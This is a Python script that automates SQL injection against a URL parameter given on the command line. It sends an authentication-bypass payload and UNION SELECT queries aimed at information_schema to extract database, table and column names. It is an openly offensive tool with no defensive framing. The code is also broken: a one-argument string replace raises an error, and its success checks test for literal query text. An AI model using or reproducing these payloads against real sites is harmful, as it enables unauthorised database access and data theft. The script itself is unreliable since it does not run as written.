import requests
import sys

def test_sql_injection(url, param, payload):
    """
    Tests a parameter for SQL injection vulnerability using a given payload.

    :param url: Target URL (e.g., http://example.com/page?id=1)
    :param param: Vulnerable parameter name (e.g., 'id')
    :param payload: SQL injection payload (e.g., "' OR '1'='1")
    :return: Response text
    """
    # Craft URL with payload
    injection_url = url.replace(f"{param}=") + f"{payload}"
    print(f"[INFO] Testing payload: {payload}")

    # Send the request
    try:
        response = requests.get(injection_url, timeout=10)
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None

def find_data(url, param):
    """
    Automates SQL injection to extract data from the database.

    :param url: Target URL (e.g., http://example.com/page?id=1)
    :param param: Vulnerable parameter name (e.g., 'id')
    """
    # Example payload to extract database name
    payloads = [
        "' OR '1'='1; -- ",  # Basic authentication bypass
        "' UNION SELECT null, database(); -- ",  # Extract database name
        "' UNION SELECT null, table_name FROM information_schema.tables; -- ",  # Extract table names
        "' UNION SELECT null, column_name FROM information_schema.columns; -- "  # Extract column names
    ]

    for payload in payloads:
        response = test_sql_injection(url, param, payload)
        if response and "database()" in response:
            print("[SUCCESS] Found database name:")
            print(response)
            break
        elif response and "table_name" in response:
            print("[SUCCESS] Found table names:")
            print(response)
            break
        elif response and "column_name" in response:
            print("[SUCCESS] Found column names:")
            print(response)
            break
        else:
            print("[INFO] Payload did not return expected results.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python sql_injection.py <url> <param>")
        print("Example: python sql_injection.py http://example.com/page?id= id")
        sys.exit(1)

    target_url = sys.argv[1]
    vulnerable_param = sys.argv[2]

    print(f"[INFO] Target URL: {target_url}")
    print(f"[INFO] Vulnerable Parameter: {vulnerable_param}")

    find_data(target_url, vulnerable_param)
